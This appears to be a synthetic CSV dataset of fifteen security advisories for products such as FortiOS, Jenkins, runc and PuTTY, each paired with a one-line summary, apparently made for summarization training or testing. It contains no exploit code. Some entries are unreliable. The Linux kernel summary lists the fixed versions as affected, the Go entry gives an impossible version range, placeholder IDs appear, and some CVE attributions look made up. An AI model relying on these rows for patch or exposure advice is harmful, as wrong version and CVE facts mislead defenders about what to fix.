advisory,summary
"Fortinet PSIRT released an advisory for CVE-2024-23113, a format-string vulnerability in the FortiOS fgfmd daemon used for FortiGate-to-FortiManager communication. Severity: Critical (CVSS 9.8). An unauthenticated remote attacker can execute arbitrary commands on affected devices by sending crafted requests to the management interface. Affects FortiOS 7.0.0-7.0.13, 7.2.0-7.2.6, 7.4.0-7.4.2. Patched in 7.0.14, 7.2.7, 7.4.3. Workaround: restrict fgfmd access to trusted management networks via firewall rules.","Critical unauth RCE in FortiOS fgfmd (CVE-2024-23113, CVSS 9.8). Patch to 7.0.14 / 7.2.7 / 7.4.3 or restrict management-network access."
"GitLab released security release 17.0.1 covering CVE-2024-5655, a cross-site scripting vulnerability in the merge-request description renderer. Markdown rendered through the default sanitizer fails to escape certain Unicode bidi-override characters, allowing a crafted MR description to inject script when viewed. Severity: Medium (CVSS 6.4). Affects GitLab CE and EE 16.4-17.0. Recommended action: upgrade. Workaround: disable inline HTML in markdown via instance settings.","Medium XSS in GitLab MR markdown renderer (CVE-2024-5655). Upgrade to 17.0.1; disable inline HTML as workaround."
"NPM advisory GHSA-XXXX for the popular `tar` package (versions before 6.2.1) describes a path-traversal vulnerability when extracting archives. A malicious tarball with crafted relative paths can write files outside the extraction directory, leading to arbitrary file overwrite. Severity: High. Most node-based build tools and package managers use `tar` transitively. Upgrade tar to 6.2.1 or later; rebuild lock files to pick up the patched version.","High path-traversal in npm `tar` <6.2.1. Malicious tarballs can write outside the extract dir. Upgrade tar + rebuild package-lock.json."
"VMware Aria Operations for Networks (formerly vRealize Network Insight) is affected by CVE-2024-22247, a hardcoded SSH credential issue in versions 6.10 through 6.12. The credential allows local network access via SSH to gain administrative privileges on the appliance. Severity: Important. VMware has released patched OVAs and a hotfix script. Recommended action: apply the hotfix and rotate the SSH host keys. Workaround: restrict SSH access to known management IPs.","Hardcoded SSH creds in VMware Aria Ops for Networks 6.10–6.12 (CVE-2024-22247). Apply hotfix + rotate SSH keys."
"Ivanti Connect Secure VPN appliances were found to contain CVE-2024-21887, a command-injection vulnerability in the web-based admin interface. An authenticated administrator can execute arbitrary commands as root. Severity: High (CVSS 9.1). Combined with CVE-2024-21893 (server-side request forgery), an unauthenticated attacker can chain to full compromise. Mass exploitation observed since January 2024. Recommended action: apply patches immediately; if appliance was internet-exposed before patching, treat as compromised and rebuild from clean image. CISA issued an emergency directive.","Critical chained exploit on Ivanti Connect Secure (CVE-2024-21887 + 21893). Internet-exposed appliances should be assumed compromised — rebuild from clean image after patching. CISA emergency directive issued."
"OpenSSL 3.3.1 release notes describe CVE-2024-4741, a use-after-free in the SSL_free_buffers function affecting servers that buffer incoming traffic in non-blocking I/O mode. Severity: Low (CVSS 3.7) due to the narrow trigger window and read-only memory access. Most production deployments are not exploitable. Upgrade as part of standard quarterly maintenance.","Low-severity UAF in OpenSSL 3.x SSL_free_buffers (CVE-2024-4741). Ship in next quarterly patch cycle; no urgent action."
"WordPress 6.5.5 security release addresses three vulnerabilities: CVE-2024-31210 (stored XSS in HTML API), CVE-2024-32111 (path traversal in pluggable.php), and CVE-2024-33908 (open redirect in template-canvas). Severity overall: Medium. Affects core WordPress prior to 6.5.5 and earlier maintenance branches 6.4.4, 6.3.5, 6.2.6, 6.1.7. Auto-updates have been enabled for affected sites running default config. Manual upgrade required for sites with auto-updates disabled.","WordPress core fixes 3 medium XSS/path-traversal/open-redirect bugs in 6.5.5. Auto-updates roll out automatically; manual sites should upgrade."
"PuTTY versions 0.68 to 0.80 (CVE-2024-31497, severity: High) generate ECDSA NIST-P521 signatures with biased k values, allowing an attacker who collects ~60 signatures to recover the private SSH key. PuTTY's authentication when using NIST-P521 keys is therefore unsafe. Recommended action: upgrade PuTTY to 0.81; revoke and re-issue any NIST-P521 keys that were used with affected PuTTY versions. ECDSA-P256, P384, and Ed25519 keys are unaffected.","High: PuTTY 0.68–0.80 leaks NIST-P521 SSH private keys via biased ECDSA. Upgrade + rotate all P521 keys; P256/P384/Ed25519 are unaffected."
"GitHub published a security advisory for runc, the OCI container runtime, covering CVE-2024-21626 (filesystem breakout via /proc fd leak). An attacker who controls a container image can escape the container and access the host filesystem by exploiting a race between file-descriptor handling and namespace setup. Severity: High (CVSS 8.6). Affects runc 1.1.11 and earlier. Fixed in 1.1.12. Container platforms (Docker, containerd, Kubernetes, Podman) bundle runc and must update their distributions.","High container-breakout in runc ≤1.1.11 (CVE-2024-21626). Container platforms must update to runc 1.1.12. Affects Docker, containerd, k8s, Podman."
"Cloudflare disclosed CVE-2024-3661 in their Cloudflare Pages product. A misconfiguration in the build-time secret-injection layer caused environment variables marked as 'encrypted' to be embedded in the final static-site bundle in plaintext for ~30% of sites built between March 1 and April 12, 2024. Severity: High. Affected customers have been notified individually. Recommended action: rotate any API keys, database credentials, or signing tokens that were configured as build secrets during the affected window.","Cloudflare Pages exposed build-time 'encrypted' secrets in static bundles for ~30% of sites (Mar 1 – Apr 12). Rotate ALL build-secret API keys/DB creds/tokens from that window."
"Linux kernel 6.9 includes a fix for CVE-2024-26581, a use-after-free in the netfilter nf_tables expression module that allows a local attacker with CAP_NET_ADMIN to gain root via heap-spray exploitation. Severity: High. Backports available for stable kernels 6.6.30, 6.1.90, and 5.15.157. Distributions are pushing patches through standard update channels. Workaround: disable nf_tables module if not used (rare; required by most modern firewalling stacks).","High local-root in Linux kernel nf_tables (CVE-2024-26581). Patch via distro updates; affects 5.15.157+ / 6.1.90+ / 6.6.30+."
"Jenkins published security advisory SECURITY-3314 covering CVE-2024-23897, an arbitrary file read in the Jenkins CLI argument parser. The args4j library used by Jenkins replaces '@' character prefixes with file contents, allowing an unauthenticated attacker (or authenticated with Overall/Read) to leak arbitrary files including the Jenkins secrets directory. Severity: Critical (CVSS 9.8 unauth or 7.5 auth). Affects Jenkins LTS 2.426.2 and earlier, weekly 2.441 and earlier. Fixed in LTS 2.426.3 and weekly 2.442. Active exploitation observed.","Critical Jenkins CLI file-read (CVE-2024-23897, CVSS 9.8). Lets unauth attackers leak secrets directory. Patch to LTS 2.426.3 / weekly 2.442 immediately. Exploited in wild."
"Spring Framework released CVE-2024-22243 advisory: open-redirect vulnerability in UriComponentsBuilder when used to parse user-supplied URLs and then redirect or call HttpRequest.create on the parsed result. Severity: Medium. Affects Spring Framework 6.0.0-6.0.16 and 5.3.0-5.3.31. Fixed in 6.0.17 and 5.3.32. Mitigation: validate the host component of any URL parsed from user input before using it for navigation.","Medium open-redirect in Spring UriComponentsBuilder (CVE-2024-22243). Upgrade to 6.0.17 / 5.3.32 or validate user-supplied URL hosts before navigation."
"GoLang security advisory for CVE-2024-24784, a header-smuggling vulnerability in net/mail. The mail.ParseAddressList function does not correctly handle CR/LF/NUL characters in display-name fields, allowing an attacker to inject headers when the parsed address is used to construct an email. Severity: Medium. Affects Go 1.21.x before 1.21.7 and 1.22.x before 1.22.0. Recommended action: upgrade Go runtime; rebuild and redeploy any service that handles user-supplied email addresses.","Medium header-smuggling in Go net/mail.ParseAddressList (CVE-2024-24784). Upgrade Go to 1.21.7+ / 1.22.0+. Affects services parsing user email addrs."
"Docker Desktop released security update 4.31.0 addressing CVE-2024-XXXX (severity: High), a privilege escalation in the Docker Desktop privileged helper service. A local user can gain root on macOS or SYSTEM on Windows by exploiting an insecure named-pipe / Unix-socket message validation. Affects Docker Desktop 4.27 through 4.30.x on macOS and Windows. Linux Docker Engine is not affected. Auto-update is enabled by default; users with manual update mode should upgrade promptly.","High local-priv-esc in Docker Desktop helper service (4.27–4.30.x, macOS+Win). Upgrade to 4.31.0+; Linux Docker Engine unaffected."
